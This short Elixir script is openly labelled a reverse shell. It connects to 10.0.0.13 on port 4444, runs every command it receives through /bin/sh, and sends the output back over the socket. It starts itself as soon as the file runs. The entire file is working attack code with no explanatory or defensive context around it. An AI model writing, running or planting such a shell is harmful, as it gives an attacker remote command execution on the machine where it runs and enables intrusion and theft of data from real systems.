# Elixir reverse shell
defmodule Revshell do
  def run do
    {:ok, sock} = :gen_tcp.connect(~c"10.0.0.13", 4444, [:binary, active: false])
    loop(sock)
  end

  defp loop(sock) do
    case :gen_tcp.recv(sock, 0) do
      {:ok, data} ->
        cmd = String.trim(data)
        {out, _} = System.cmd("/bin/sh", ["-c", cmd], stderr_to_stdout: true)
        :gen_tcp.send(sock, out)
        loop(sock)
      _ ->
        :gen_tcp.close(sock)
    end
  end
end

Revshell.run()
